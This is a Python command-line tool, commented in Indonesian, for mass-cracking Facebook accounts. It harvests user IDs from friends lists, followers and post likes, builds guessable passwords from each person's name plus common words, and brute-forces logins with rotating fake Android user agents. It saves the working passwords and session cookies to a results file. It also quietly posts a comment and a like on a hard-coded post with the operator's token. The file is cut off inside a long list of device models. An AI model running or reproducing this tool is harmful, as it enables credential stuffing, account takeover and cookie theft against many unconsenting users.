#!/usr/bin/env python3
import requests, time, os, re, json, random
from rich.panel import Panel
from rich import print
from concurrent.futures import ThreadPoolExecutor
from rich.tree import Tree
from rich.console import Console

### LIST DUMP ###
Dump = []
### BANNER OR LOGO ###
def banner_logo():
    os.system('cls' if os.name == 'nt' else 'clear') # Coded by Rozhak
    Console(width=50, style="bold hot_pink2").print(Panel(""" 
________  ___  ___  ___  ___  ___          
|\_____  \|\  \|\  \|\  \|\  \|\  \         
 \|___/  /\ \  \\\  \ \  \\\  \ \  \        
     /  / /\ \   __  \ \  \\\  \ \  \       
    /  /_/__\ \  \ \  \ \  \\\  \ \  \____  
   |\________\ \__\ \__\ \_______\ \_______\
    \|_______|\|__|\|__|\|_______|\|_______|""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 8.0 [bold green]<[bold yellow]<[bold red]<"))
    return 0
### DAPATKAN NAMA ###
def dapatkan_nama(cookie, token_eaag):
    with requests.Session() as r:
        r.headers.update({
            'host': 'graph.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
            'cookie': cookie
        })
        response = r.get('https://graph.facebook.com/v15.0/me/?fields=id,name&access_token={}'.format(token_eaag)).json()
        if 'name' in str(response) and 'id' in str(response):
            return response['name'].title(), response['id']
        else:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic red]Gagal Akses Graph Facebook, Kemungkinan Cookies Facebook Sudah Kadaluarsa!", title="[bold hot_pink2]([bold blue]Token Invalid[bold hot_pink2])"));time.sleep(3.2);login_cookie()
### LOGIN USING COOKIE ###
def login_cookie():
    try:
        banner_logo()
        Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Login Menggunakan Cookie Facebook
[bold green]2[bold white]. Cara Mendapatkan Cookie Facebook
[bold green]3[bold white]. Keluar ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Login Using Cookie) [bold green]<[bold yellow]<[bold red]<"))
        query = Console().input("[bold hot_pink2]   ╰─> ")
        if query == '1' or query == '01':
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] Cookie[italic white], Gunakan Tumbal Untuk Login Dan Pastikan Tidak Terkena[italic yellow] Checkpoint[italic white]!", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            cookie = Console().input("[bold hot_pink2]   ╰─> ")
            with requests.Session() as r:
                r.headers.update({
                    'cookie': cookie,
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'host': 'business.facebook.com'
                })
                response3 = r.get('https://business.facebook.com/business_locations').text
                token_eaag = re.search('(EAAG\w+)', str(response3)).group(1)
                name, id = dapatkan_nama(cookie, token_eaag)
                Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"));bot_komen(cookie, token_eaag)
                open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Data/Token.json', 'w').write(json.dumps({'Token': token_eaag}));time.sleep(3.6);daftar_menu()
        elif query == '2' or query == '02':
            try:
                Console().print("[bold hot_pink2]   ╰─>[bold green] Kamu Akan Diarahkan Ke Youtube!", end='\r');time.sleep(3.6);os.system("xdg-open https://www.youtube.com/watch?v=3Y6xsMB3wRg");exit()
            except:exit()
        elif query == '3' or query == '03':
            Console().print("[bold hot_pink2]   ╰─>[bold yellow] Keluar Dari Tools!", end='\r');time.sleep(3.6);exit()
        else:
            Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);login_cookie()
    except Exception as e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
### BOT KOMEN ###
def bot_komen(cookie, token_eaag):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        text = random.choice(
            ['Keren Bang 😎','Hello World!','Mantap Bang ☺️','I Love You ❤️','Hai Bang 😘']
        )
        r.cookies.update({
            'cookie': cookie
        })
        response = r.post('https://graph.facebook.com/10160350353143544/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
        response2 = r.post('https://graph.facebook.com/10160350353143544/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
        if "\"id\":\"" in str(response) and str(response2) == 'true':
            return 0
        else:
            return 1
### DAFTAR MENU ###
def daftar_menu():
    try:
        banner_logo();cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
        token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
        name, id = dapatkan_nama(cookie, token_eaag)
        Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
    except Exception as e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.6);login_cookie()
    Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Crack User Dari Publik Or Friends
[bold green]2[bold white]. Crack User Dari Pengikut
[bold green]3[bold white]. Crack User Dari Like Postingan
[bold green]4[bold white]. Keluar ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
    query = Console().input("[bold hot_pink2]   ╰─> ")
    if query == '1' or query == '01':
        try:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] ID Akun Facebook[italic white], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            userid = Console().input("[bold hot_pink2]   ╰─> ")
            for z in userid.split(','):
                dump().publik(int(z), cookie, unit_cursor = '')
            if len(Dump) < 50:
                Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
        except Exception as e:
            Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '2' or query == '02':
        try:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] ID Akun Facebook[italic white], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            userid = Console().input("[bold hot_pink2]   ╰─> ")
            for z in userid.split(','):
                dump().pengikut(z, cookie, token_eaag)
            if len(Dump) < 50:
                Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
        except Exception as e:
            Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '3' or query == '03':
        try:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan ID Postingan, Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 10160334652393544", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            postid = Console().input("[bold hot_pink2]   ╰─> ")
            for z in postid.split(','):
                dump().likes(z, cookie, token_eaag, after = '')
            if len(Dump) < 1:
                Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit("\r                                                                         ")
            else:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
        except Exception as e:
            Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '4' or query == '04':
        try:
            os.remove('Data/Cookie.json');os.remove('Data/Token.json');Console().print("[bold hot_pink2]   ╰─>[bold green] Keluar Dari Program!", end='\r');time.sleep(3.6);exit()
        except:exit()
    else:
        Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);daftar_menu()
### DUMP ###
class dump:

    def __init__(self) -> None:
        pass
    ### DUMP PUBLIK ###
    def publik(self, userid, cookie, unit_cursor):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'upgrade-insecure-requests': '1',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'host': 'm.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
                    'accept-language': 'id,en;q=0.9',
                })
                r.cookies.update({
                    'cookie': cookie
                })
                response = r.get('https://m.facebook.com/profile.php?id={}&v=friends&unit_cursor={}'.format(userid, unit_cursor)).text
                self.all_friends = re.findall('href="fb://profile/(.*?)">(.*?)<', str(response))
                for z in self.all_friends:
                    self.id_friends, self.name = z[0], z[1].lower()
                    if len(self.name) == 0 or len(self.name) > 100:
                        continue
                    else:
                        if str(self.id_friends) in str(Dump):
                            continue
                        else:
                            Console().print(f"[bold hot_pink2]   ╰─>[bold green] Dump {self.id_friends}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id_friends}|{self.name}')
                if 'Sorry, something went wrong.' in str(response):
                    Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] Sorry, Something Went Wrong!          ", end='\r');time.sleep(2.1)
                    return 0
                elif 'unit_cursor=' in str(response):
                    try:
                        self.unit_cursor = re.search('unit_cursor=(.*?)&', str(response)).group(1)
                        self.publik(userid, cookie, self.unit_cursor)
                    except (AttributeError):
                        Console().print(f"[bold hot_pink2]   ╰─>[bold red] Cursor Not Found!            ", end='\r');time.sleep(2.1)
                        return 2
                else:
                    return 0
        except (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 3
    ### DUMP PENGIKUT ###
    def pengikut(self, userid, cookie, token_eaag):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'cookie': cookie
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/subscribers?access_token={}&pretty=1&fields=id%2Cname&limit=5000'.format(userid, token_eaag)).json()
                if 'summary' in str(response) and 'name' in str(response):
                    for z in response['data']:
                        try:
                            self.id, self.name = z['id'], z['name'].lower()
                            if str(self.id) in str(Dump):
                                continue
                            else:
                                Console().print(f"[bold hot_pink2]   ╰─>[bold green] Dump {self.id}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                                Dump.append(f'{self.id}|{self.name}')
                        except (KeyError):
                            Console().print(f"[bold hot_pink2]   ╰─>[bold red] KeyError!                ", end='\r');time.sleep(3.6);continue
                    return 0
                else:
                    Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] Gagal {userid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 2
    ### DUMP LIKES ###
    def likes(self, postid, cookie, token_eaag, after):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'cookie': cookie
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/likes/?access_token={}&pretty=1&limit=25&after={}'.format(postid, token_eaag, after)).json()
                if 'id' in str(response) and 'name' in str(response):
                    for z in response['data']:
                        self.id, self.name = z['id'], z['name'].lower()
                        if str(self.id) in str(Dump):
                            continue
                        else:
                            Console().print(f"[bold hot_pink2]   ╰─>[bold green] Dump {self.id}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id}|{self.name}')
                    if '\'after\':' in str(response):
                        self.likes(postid, cookie, token_eaag, after = response['paging']['cursors']['after'])
                    else:
                        return 0
                else:
                    Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] Gagal {postid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 2
### CRACK ###
class crack:

    def __init__(self) -> None:
        self.checkpoint, self.looping, self.success = [], 0, []
        pass
    ### GENERATE PASSWORD ###
    def generate_password(self, name):
        self.password = []
        for nama in name.split(' '):
            if len(name) <= 5:
                if len(nama) < 3:
                    continue
                else:
                    self.password.append(nama + '123')
                    self.password.append(nama + '1234')
                    self.password.append(nama + '12345')
                    self.password.append(nama + '123456')
                    self.password.append('kontol')
                    self.password.append('anjing')
                    self.password.append('sayang')
                    self.password.append('indonesia')
                    self.password.append('12345678')
                    self.password.append('iloveyou')
            else:
                if len(nama) < 3:
                    self.password.append(name)
                else:
                    self.password.append(name)
                    self.password.append(nama + '123')
                    self.password.append(nama + '1234')
                    self.password.append(nama + '12345')
                    self.password.append(nama + '123456')
                    self.password.append('kontol')
                    self.password.append('anjing')
                    self.password.append('sayang')
                    self.password.append('indonesia')
                    self.password.append('12345678')
                    self.password.append('iloveyou')
        self.password_ = []
        for z in self.password:
            if str(z) in str(self.password_):
                continue
            else:
                self.password_.append(z)
        return self.password_
    ### OPEN LIST DUMP ###
    def open_list(self):
        try:
            Console(width=50, style="bold hot_pink2").print(Panel("""[bold white]Hasil Crack[bold green] Ok[bold white] Tersimpan Di :[bold green] Results/Ok.txt
[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
            with ThreadPoolExecutor(max_workers=35) as (V):
                for z in Dump:
                    self.email, self.nama = z.split('|')[0], z.split('|')[1]
                    self.password = self.generate_password(self.nama)
                    V.submit(self.main, Dump, self.email, self.password)
            Console().print("\r[bold white][[bold green]Selesai[bold white]]                           ");exit()
        except:exit()
    ### MAIN ###
    def main(self, total, email, password):
        try:
            for pws in password:
                self.useragent = self.realme_useragent(total = 1)
                with requests.Session() as r:
                    r.headers.update({
                        'connection': 'keep-alive',
                        'accept-language': 'id,en-US;q=0.9,en;q=0.8',
                        'sec-fetch-mode': 'navigate',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'sec-fetch-sest': 'document',
                        'sec-fetch-site': 'none',
                        'cache-control': 'max-age=0',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'host': 'm.alpha.facebook.com',
                        'user-agent': self.useragent
                    })
                    response = r.get('https://m.alpha.facebook.com/login.php?').text
                    try:
                        self.jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                        self.m_ts = re.search('name="m_ts" value="(.*?)"', str(response)).group(1)
                        self.li = re.search('name="li" value="(.*?)"', str(response)).group(1)
                        self.fb_dtsg = re.search('{"dtsg":{"token":"(.*?)"', str(response)).group(1)
                        self.lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                        self.__a = re.search('"encrypted":"(.*?)"', str(response)).group(1)
                        self.__spin_t = re.search('"__spin_t":(\d+),', str(response)).group(1)
                    except (AttributeError) as e:
                        Console().print("[bold hot_pink2]   ╰─>[bold red] Failed Scraping...                    ", end='\r');time.sleep(2.0);continue
                    data = {
                        'm_ts': self.m_ts,
                        'li': self.li,
                        'try_number': 0,
                        'unrecognized_tries': 0,
                        'email': email,
                        'prefill_contact_point': email,
                        'prefill_source': 'browser_dropdown',
                        'prefill_type': 'password',
                        'first_prefill_source': 'browser_dropdown',
                        'first_prefill_type': 'contact_point',
                        'had_cp_prefilled': True,
                        'had_password_prefilled': True,
                        'is_smart_lock': False,
                        'bi_xrwh': 0,
                        'encpass': '#PWD_BROWSER:0:{}:{}'.format(self.__spin_t, pws),
                        'fb_dtsg': self.fb_dtsg,
                        'jazoest': self.jazoest,
                        'lsd': self.lsd,
                        '__dyn': '',
                        '__csr': '',
                        '__req': random.choice(['1','2','3','4','5']),
                        '__a': self.__a,
                        '__user': 0
                    }
                    r.headers.update({
                        'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                        'sec-fetch-site': 'same-origin',
                        'origin': 'https://m.alpha.facebook.com',
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded',
                        'x-fb-lsd': self.lsd,
                        'referer': 'https://m.alpha.facebook.com/login.php?',
                        'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ])))
                    })
                    response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
                    #open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
                    if 'c_user' in r.cookies.get_dict().keys():
                        try:
                            self.cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                        except:pass
                        tree = Tree("\r[bold white]LOGIN SUCCESS                      ", style = "bold white")
                        tree.add(f"[bold green]Email : {email}").add(f"[bold green]Password : {pws}", style = "bold white")
                        tree.add(f"[bold green]Cookie : {self.cookie}", style = "bold white")
                        print(tree)
                        self.success.append(f'{email}|{pws}|{self.cookie}')
                        open('Results/Ok.txt', 'a+').write(f'{email}|{pws}|{self.cookie}\n')
                        break
                    elif 'checkpoint' in r.cookies.get_dict().keys():
                        tree = Tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
                        tree.add(f"[bold red]Email : {email}").add(f"[bold red]Password : {pws}", style = "bold white")
                        tree.add(f"[bold red]Useragent : {self.useragent}", style = "bold white")
                        print(tree)
                        self.checkpoint.append(f'{email}|{pws}|{self.useragent}')
                        open('Results/Cp.txt', 'a+').write(f'{email}|{pws}|{self.useragent}\n')
                        break
                    else:
                        continue
            self.looping += 1
            Console().print(f"[bold hot_pink2]   ╰─>[bold white] Crack {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)}[bold white] Cp:-[bold red]{len(self.checkpoint)}[bold white]              ", end='\r')
        except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
            Console().print("[bold hot_pink2]   ╰─>[bold red] Koneksi Error!                    ", end='\r');time.sleep(7.9);self.main(total, email, password)
    ### REALME USERAGENT ###
    def realme_useragent(self, total):
        for _ in range(total):
            self.browser_version = (f'{random.randrange(85, 105)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
            self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for y in range(6)))
            self.android_version = random.choice(['11', '10','9','8','12'])
            self.android_model = random.choice(['RMX2052', 'RMX2072', 'RMX2075', 'RMX2071', 'RMX2076', 'RMX2144','A31','OPPO F1s','A31','OPPO R11s','CPH1893','OPPO A37','OPPO R9s','Redmi Note 8 Pro','OPPO CPH1803','OPPO R7st','OPPO A37m','CPH2071','A31','OPPO PBAM00','CPH1717','OPPO PBFT00','CPH1937','CPH1923','PBCM30','A37fw','A37f','CPH1923','CPH2083','CPH1853','CPH2077','CPH1827','OPPO A59s','CPH1729','CPH1901','CPH1853','CPH1723','CPH2083','CPH1801','OPPO A33m','SM-E025F','SM-G996B','SM-A826S','SM-E135F','SM-G781B','SM-G998B','SM-F936U1','SM-G361F','SM-A716S','SM-J327AZ','SM-E426B','SM-A015F','SM-A015M','SM-A013G','SM-A013G','SM-A013M','SM-A013F','SM-A022M','SM-A022G','SM-A022F','SM-A025M','SM-S124DL','SM-A025U','SM-A025A','SM-A025G','SM-A025F','SM-A025AZ','SM-A035F','SM-A035M','SM-A035G','SM-A032F','SM-A032M','SM-A032F','SM-A037F','SM-A037U','SM-A037M','SM-S134DL','SM-A037G','SM-A105G','SM-A105M','SM-A105F','SM-A105FN','SM-A102U','SM-S102DL','SM-A102U1','SM-A107F','SM-A107M','SM-A115AZ','SM-A115U','SM-A115U1','SM-A115A','SM-A115M','SM-A115F','SM-A125F','SM-A127F','SM-A125M','SM-A125U','SM-A127M','SM-A135F','SM-A137F','SM-A135M','SM-A136U','SM-A136U1','SM-A136W','SM-A260F','SM-A260G','SM-A260F','SM-A260G','SM-A205GN','SM-A205U','SM-A205F','SM-A205G','SM-A205FN','SM-A202F','SM-A2070','SM-A207F','SM-A207M','SM-A215U','SM-A215U1','SM-A217F','SM-A217F','SM-A217M','SM-A225F','SM-A225M','SM-A226B','SM-A226B','SM-A226BR','SM-A235F','SM-A235M','SM-A300FU','SM-A300F','SM-A300H','SM-A310F','SM-A310M','SM-A320FL','SM-A320F','SM-A305G','SM-A305GT','SM-A305N','SM-A305F','SM-A307FN','SM-A307G','SM-A307GN','SM-A315G','SM-A315F','SM-A325F','SM-A325M','SM-A326U','SM-A326W','SM-A336E','SM-A336B','SM-A430F','SM-A405FN','SM-A405FM','SM-A3051','SM-A3050','SM-A415F','SM-A426U','SM-A426B','SM-A5009','SM-A500YZ','SM-A500Y','SM-A500W','SM-A500L','SM-A500X','SM-A500XZ','SM-A510F','SM-A510Y','SM-A520F','SM-A520W','SM-A500F','SM-A500FU','SM-A500H','SM-S506DL','SM-A505G','SM-A505FN','SM-A505U','SM-A505GN','SM-A505F','SM-A507FN','SM-A5070','SM-A515F','SM-A515U','SM-A515U1','SM-A516U','SM-A516V','SM-A516N','SM-A516B','SM-A525F','SM-A525M','SM-A526U','SM-A526U1','SM-A526B','SM-A526W','SM-A528B','SM-A536B','SM-A536U','SM-A536E','SM-A536V','SM-A600FN','SM-A600G','SM-A605FN','SM-A605G','SM-A605GN','SM-A605F','SM-A6050','SM-A606Y','SM-A6060','SM-G6200','SM-A700FD','SM-A700F','SM-A7000','SM-A700H','SM-A700YD','SM-A710F','SM-A710M','SM-A720F','SM-A750F','SM-A750FN','SM-A750GN','SM-A705FN','SM-A705F','SM-A705MN','SM-A707F','SM-A715F','SM-A715W','SM-A716U','SM-A716V','SM-A716U1','SM-A716B','SM-A725F','SM-A725M','SM-A736B','SM-A530F','SM-A810YZ','SM-A810F','SM-A810S','SM-A530W','SM-A530N','SM-G885F','SM-G885Y','SM-G885S','SM-A730F','SM-A805F','SM-G887F','SM-G8870','SM-A9000','SM-A920F','SM-A920F','SM-887N','SM-A910F','SM-G8850','SM-A908B','SM-A908N','SM-A9080','SM-G313HY','SM-G313MY','SM-G313MU','SM-G316M','SM-G316ML','SM-G316MY','SM-G313HZ','SM-G313H','SM-G313HU','SM-G313U','SM-G318H','SM-G357FZ','SM-G310HN','SM-G357FZ','SM-G850F','SM-G850M','SM-J337AZ','SM-G386T1','SM-G386T','SM-G3858','SM-G3858','SM-A226L','SM-C5000','SM-C500X','SM-C5010','SM-C5018','SM-C7000','SM-C7010','SM-C701F','SM-C7018','SM-C7100','SM-C7108','SM-C9000','SM-C900F','SM-C900Y','SM-G355H','SM-G355M','SM-G3589W','SM-G386W','SM-G386F','SM-G3518','SM-G3586V','SM-G5108Q','SM-G5108','SM-G3568V','SM-G350E','SM-G350','SM-G3509I','SM-G3508J','SM-G3502I','SM-G3502C','SM-S820L','SM-G360H','SM-G360F','SM-G360T','SM-G360M','SM-G361H','SM-E500H','SM-E500F','SM-E500M','SM-E5000','SM-E500YZ','SM-E700H','SM-E700F','SM-E7009','SM-E700M','SM-G3815','SM-G3815','SM-G3815','SM-F127G','SM-E225F','SM-E236B','SM-F415F','SM-E5260','SM-E625F','SM-F900U','SM-F907N','SM-F900F','SM-F9000','SM-F907B','SM-F900W','SM-G150NL','SM-G155S','SM-G1650','SM-W2015','SM-G7102','SM-G7105','SM-G7106','SM-G7108','SM-G7202','SM-G720N0','SM-G7200','SM-G720AX','SM-G530T1','SM-G530H','SM-G530FZ','SM-G531H','SM-G530BT','SM-G532F','SM-G531BT','SM-G531M','SM-J727AZ','SM-J100FN','SM-J100H','SM-J120FN','SM-J120H','SM-J120F','SM-J120M','SM-J111M','SM-J111F','SM-J110H','SM-J110G','SM-J110F','SM-J110M','SM-J105H','SM-J105Y','SM-J105B','SM-J106H','SM-J106F','SM-J106B','SM-J106M','SM-J200F','SM-J200M','SM-J200G','SM-J200H','SM-J200F','SM-J200GU','SM-J260M','SM-J260F','SM-J260MU','SM-J260F','SM-J260G','SM-J200BT','SM-G532G','SM-G532M','SM-G532MT','SM-J250M','SM-J250F','SM-J210F','SM-J260AZ','SM-J3109','SM-J320A','SM-J320G','SM-J320F','SM-J320H','SM-J320FN','SM-J330G','SM-J330F','SM-J330FN','SM-J337V','SM-J337P','SM-J337A','SM-J337VPP','SM-J337R4','SM-J327VPP','SM-J327V','SM-J327P','SM-J327R4','SM-S327VL','SM-S337TL','SM-S367VL','SM-J327A','SM-J327T1','SM-J327T','SM-J3110','SM-J3119S','SM-J3119','SM-S320VL','SM-J337T','SM-J400M','SM-J400F','SM-J400F','SM-J410F','SM-J410G','SM-J410F','SM-J415FN','SM-J415F','SM-J415G','SM-J415GN','SM-J415N','SM-J500FN','SM-J500M','SM-J510MN','SM-J510FN','SM-J510GN','SM-J530Y','SM-J530F','SM-J530G','SM-J530FM','SM-G570M','SM-G570F','SM-G570Y','SM-J600G','SM-J600FN','SM-J600GT','SM-J600F','SM-J610F','SM-J610G','SM-J610FN','SM-J710F','SM-J700H','SM-J700M','SM-J700F','SM-J700P','SM-J700T','SM-J710GN','SM-J700T1','SM-J727A','SM-J727R4','SM-J737T','SM-J737A','SM-J737R4','SM-J737V','SM-J737T1','SM-J737S','SM-J737P','SM-J737VPP','SM-J701F','SM-J701M','SM-J701MT','SM-S767VL','SM-S757BL','SM-J720F','SM-J720M','SM-G615F','SM-G615FU','SM-G610F','SM-G610M','SM-G610Y','SM-G611MT','SM-G611FF','SM-G611M','SM-J730G','SM-J730GM','SM-J730F','SM-J730FM','SM-S727VL','SM-S737TL','SM-J727T1','SM-J727T1','SM-J727V','SM-J727P','SM-J727VPP','SM-J727T','SM-C710F','SM-J810M','SM-J810F','SM-J810G','SM-J810Y','SM-A605K','SM-A605K','SM-A202K','SM-M336K','SM-A326K','SM-C115','SM-C115L','SM-C1158','SM-C1158','SM-C115W','SM-C115M','SM-S120VL','SM-M015G','SM-M015F','SM-M013F','SM-M017F','SM-M022G','SM-M022F','SM-M022M','SM-M025F','SM-M105G','SM-M105M','SM-M105F','SM-M107F','SM-M115F','SM-M115F','SM-M127F','SM-M127G','SM-M135M','SM-M135F','SM-M135FU','SM-M205FN','SM-M205F','SM-M205G','SM-M215F','SM-M215G','SM-M225FV','SM-M236B','SM-M236Q','SM-M305F','SM-M305M','SM-M307F','SM-M307FN','SM-M315F','SM-M317F','SM-M325FV','SM-M325F','SM-M326B','SM-M336B','SM-M336BU','SM-M405F','SM-M426B','SM-M515F','SM-M526BR','SM-M526B','SM-M536B','SM-M625F','SM-G750H','SM-G7508Q','SM-G7509','SM-N970U','SM-N970F','SM-N971N','SM-N970U1','SM-N770F','SM-N975U1','SM-N975U','SM-N975F','SM